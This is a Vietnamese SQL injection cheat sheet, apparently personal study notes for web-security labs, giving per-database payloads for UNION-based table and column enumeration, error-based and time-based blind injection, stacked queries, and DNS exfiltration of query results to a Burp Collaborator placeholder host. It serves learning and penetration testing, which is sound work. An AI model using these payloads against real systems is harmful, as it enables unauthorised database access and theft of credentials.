# Bảng cheat sheet SQL injection

Bảng cheat sheet SQL injection này chứa các ví dụ về cú pháp hữu ích mà bạn có thể sử dụng để thực hiện nhiều tác vụ thường phát sinh khi thực hiện các cuộc tấn công SQL injection.

## Nối chuỗi

Bạn có thể nối nhiều chuỗi lại với nhau để tạo thành một chuỗi duy nhất.

|   |   |
|---|---|
|Oracle|`'foo'\|'bar'`|
|Microsoft|`'foo'+'bar'`|
|PostgreSQL|`'foo'\|'bar'`|
|MySQL|`'foo' 'bar'` [Lưu ý khoảng trắng giữa hai chuỗi]  <br>`CONCAT('foo','bar')`|

## Chuỗi con

Bạn có thể trích xuất một phần của chuỗi, từ một vị trí bắt đầu (offset) được chỉ định với độ dài nhất định. Lưu ý rằng chỉ mục bắt đầu được tính từ 1. Mỗi biểu thức sau đây sẽ trả về chuỗi `ba`.

|   |   |
|---|---|
|Oracle|`SUBSTR('foobar', 4, 2)`|
|Microsoft|`SUBSTRING('foobar', 4, 2)`|
|PostgreSQL|`SUBSTRING('foobar', 4, 2)`|
|MySQL|`SUBSTRING('foobar', 4, 2)`|

## Chú thích

Bạn có thể sử dụng các chú thích để cắt bớt một truy vấn và loại bỏ phần truy vấn gốc nằm sau phần dữ liệu bạn nhập vào.

|   |   |
|---|---|
|Oracle|`--comment   `|
|Microsoft|`--comment   /*comment*/`|
|PostgreSQL|`--comment   /*comment*/`|
|MySQL|`#comment`  <br>`-- comment` [Lưu ý khoảng trắng sau dấu gạch ngang kép]  <br>`/*comment*/`|

## Phiên bản cơ sở dữ liệu

Bạn có thể truy vấn cơ sở dữ liệu để xác định loại và phiên bản của nó. Thông tin này rất hữu ích khi xây dựng các cuộc tấn công phức tạp hơn.

|   |   |
|---|---|
|Oracle|`SELECT banner FROM v$version   SELECT version FROM v$instance   `|
|Microsoft|`SELECT @@version`|
|PostgreSQL|`SELECT version()`|
|MySQL|`SELECT @@version`|

## Nội dung cơ sở dữ liệu

Bạn có thể liệt kê các bảng tồn tại trong cơ sở dữ liệu và các cột có trong những bảng đó.

|            |                                                                                                                                 |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                                 |
| Microsoft  | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `    |
| PostgreSQL | ==SELECT * FROM information_schema.tables==   ==SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'== |
| MySQL      | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `    |

> [!NOTE] Dành cho PostgreSQL
> 
```sql
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
==> thằng này để t liệt kê các bảng
```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```
==> thằng này cho vào instruder để tìm đúng bảng , sau bước trên
==> sau khi có bảng rồi thì thằng này sẽ cho ra các cột của bảng
==> Biết cột, biết bảng ==> tìm được password và username
![[Pasted image 20260520172738.png|690]]
![[Pasted image 20260520172944.png|697]]


## Lỗi có điều kiện

Bạn có thể kiểm tra một điều kiện boolean đơn lẻ và kích hoạt lỗi cơ sở dữ liệu nếu điều kiện đó đúng.

|   |   |
|---|---|
|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`|
|Microsoft|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`|
|PostgreSQL|`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`|

## Trích xuất dữ liệu qua các thông báo lỗi hiển thị

Bạn có khả năng gợi ra các thông báo lỗi làm rò rỉ dữ liệu nhạy cảm được trả về bởi truy vấn độc hại của bạn.

|   |   |
|---|---|
|Microsoft|`SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.`|
|PostgreSQL|`SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"`|
|MySQL|`SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'`|

## Các truy vấn hàng loạt (hoặc xếp chồng)

Bạn có thể sử dụng các truy vấn hàng loạt để thực thi nhiều truy vấn liên tiếp nhau. Lưu ý rằng trong khi các truy vấn tiếp theo được thực thi, kết quả không được trả về cho ứng dụng. Do đó, kỹ thuật này chủ yếu được sử dụng liên quan đến các lỗ hổng dạng blind, nơi bạn có thể sử dụng truy vấn thứ hai để kích hoạt tra cứu DNS, lỗi có điều kiện hoặc độ trễ thời gian.

|   |   |
|---|---|
|Oracle|`Không hỗ trợ các truy vấn hàng loạt.`|
|Microsoft|`QUERY-1-HERE; QUERY-2-HERE   QUERY-1-HERE QUERY-2-HERE`|
|PostgreSQL|`QUERY-1-HERE; QUERY-2-HERE`|
|MySQL|`QUERY-1-HERE; QUERY-2-HERE`|

#### Lưu ý

Với MySQL, các truy vấn hàng loạt thường không thể được sử dụng để SQL injection. Tuy nhiên, điều này đôi khi có thể xảy ra nếu ứng dụng mục tiêu sử dụng một số API PHP hoặc Python nhất định để giao tiếp với cơ sở dữ liệu MySQL.

## Độ trễ thời gian

Bạn có thể gây ra độ trễ thời gian trong cơ sở dữ liệu khi truy vấn được xử lý. Đoạn mã sau sẽ gây ra độ trễ thời gian 10 giây vô điều kiện.

|   |   |
|---|---|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|

## Độ trễ thời gian có điều kiện

Bạn có thể kiểm tra một điều kiện boolean đơn lẻ và kích hoạt độ trễ thời gian nếu điều kiện đó đúng.

|   |   |
|---|---|
|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`|
|Microsoft|`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`|

## Tra cứu DNS

Bạn có thể khiến cơ sở dữ liệu thực hiện tra cứu DNS tới một miền bên ngoài. Để làm điều này, bạn sẽ cần sử dụng [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) để tạo một tên miền phụ (subdomain) Burp Collaborator duy nhất mà bạn sẽ sử dụng trong cuộc tấn công của mình, sau đó thăm dò máy chủ Collaborator để xác nhận rằng quá trình tra cứu DNS đã diễn ra.

|   |   |
|---|---|
|Oracle|Lỗ hổng (XXE) để kích hoạt tra cứu DNS. Lỗ hổng này đã được vá nhưng vẫn còn tồn tại nhiều bản cài đặt Oracle chưa được vá:<br><br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br><br>Kỹ thuật sau đây hoạt động trên các bản cài đặt Oracle đã được vá đầy đủ, nhưng yêu cầu các đặc quyền được nâng cao:<br><br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`|
|Microsoft|`exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`|
|PostgreSQL|`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`|
|MySQL|Các kỹ thuật sau đây chỉ hoạt động trên Windows:<br><br>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`  <br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|

## Tra cứu DNS kèm trích xuất dữ liệu

Bạn có thể khiến cơ sở dữ liệu thực hiện tra cứu DNS tới một miền bên ngoài có chứa kết quả của một truy vấn được chèn vào. Để làm điều này, bạn sẽ cần sử dụng [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) để tạo một tên miền phụ Burp Collaborator duy nhất mà bạn sẽ sử dụng trong cuộc tấn công của mình, sau đó thăm dò máy chủ Collaborator để lấy chi tiết về bất kỳ tương tác DNS nào, bao gồm cả dữ liệu đã được trích xuất.

|            |                                                                                                                                                                                                                                                                                                              |     |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --- |
| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|(SELECT YOUR-QUERY-HERE)\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`                                                                                            |     |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                               |     |
| PostgreSQL | `create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := 'copy (SELECT '''') to program ''nslookup '\|p\|'.BURP-COLLABORATOR-SUBDOMAIN''';   execute c;   END;   $$ language plpgsql security definer;   SELECT f();` |     |
| MySQL      | Các kỹ thuật sau đây chỉ hoạt động trên Windows:  <br>`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                              |     |
